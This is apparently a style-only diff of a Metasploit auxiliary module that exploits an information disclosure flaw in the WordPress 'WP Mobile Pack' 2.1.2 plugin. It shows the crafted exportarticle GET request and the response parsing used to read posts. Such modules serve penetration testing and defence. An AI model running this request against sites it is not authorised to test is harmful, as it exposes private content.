@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -6,36 +7,35 @@
 require 'msf/core'
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Auxiliary::Report
   include Msf::Exploit::Remote::HTTP::Wordpress
   include Msf::Auxiliary::Scanner
 
   def initialize(info = {})
     super(update_info(info,
-      'Name'           => 'WordPress Mobile Pack Information Disclosure Vulnerability',
-      'Description'    => %q{
-        This module exploits an information disclosure vulnerability in WordPress Plugin
-        "WP Mobile Pack" version 2.1.2, allowing to read files with privileges
-        information.
-      },
-      'References'     =>
-        [
-          ['WPVDB', '8107'],
-          ['PACKETSTORM', '132750']
-        ],
-      'Author'         =>
-        [
-          'Nitin Venkatesh', # Vulnerability Discovery
-          'Roberto Soares Espreto <robertoespreto[at]gmail.com>' # Metasploit Module
-        ],
-      'License'        => MSF_LICENSE
-    ))
+                      'Name'           => 'WordPress Mobile Pack Information Disclosure Vulnerability',
+                      'Description'    => %q(
+                        This module exploits an information disclosure vulnerability in WordPress Plugin
+                        "WP Mobile Pack" version 2.1.2, allowing to read files with privileges
+                        information.
+                      ),
+                      'References'     =>
+                        [
+                          ['WPVDB', '8107'],
+                          ['PACKETSTORM', '132750']
+                        ],
+                      'Author'         =>
+                        [
+                          'Nitin Venkatesh', # Vulnerability Discovery
+                          'Roberto Soares Espreto <robertoespreto[at]gmail.com>' # Metasploit Module
+                        ],
+                      'License'        => MSF_LICENSE))
 
     register_options(
       [
         OptString.new('POSTID', [true, 'The post identification to read', '1'])
-      ], self.class)
+      ], self.class
+    )
   end
 
   def check
@@ -52,20 +52,20 @@ class MetasploitModule < Msf::Auxiliary
         'vars_get'  => {
           'content'   => 'exportarticle',
           'callback'  => 'exportarticle',
-          'articleId' => "#{postid}"
+          'articleId' => postid.to_s
         }
       )
-      temp = JSON.parse(res.body.gsub(/exportarticle\(/, "").gsub(/\)/, ""))
+      temp = JSON.parse(res.body.gsub(/exportarticle\(/, "").delete(')'))
     rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, JSON::ParserError => e
       print_error("The following Error was encountered: #{e.class}")
       return
     end
 
     if res &&
-        res.code == 200 &&
-        res.body.length > 29 &&
-        res.headers['Content-Type'].include?('application/json') &&
-        !res.body.include?('"error":')
+       res.code == 200 &&
+       res.body.length > 29 &&
+       res.headers['Content-Type'].include?('application/json') &&
+       !res.body.include?('"error":')
 
       vprint_status('Enumerating...')
       res_clean = JSON.pretty_generate(temp)
